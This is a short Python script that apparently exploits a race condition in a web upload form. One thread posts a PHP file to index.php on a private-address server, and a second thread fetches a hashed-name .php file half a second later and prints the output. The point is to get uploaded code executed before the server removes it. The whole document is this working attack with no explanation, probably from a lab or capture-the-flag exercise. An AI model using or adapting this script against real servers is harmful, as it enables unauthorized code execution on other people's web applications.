import requests
import time
from threading import Thread

def f1():
    file = {'file': open('2.php','rb')}
    datas = {'upload': 'Upload'}
    r = requests.post('http://192.168.81.22:8021/index.php', files=file, data=datas)

def f2():
    rr = requests.get("http://192.168.81.22:8021/4296736f0faec89c8b3abf55722a92590a9ec7d6.php")
    print(rr.text)

t1 = Thread(target = f1)
t2 = Thread(target = f2)

try:
    t1.start()
    time.sleep(0.5)
    t2.start()
except :
    print("failed")
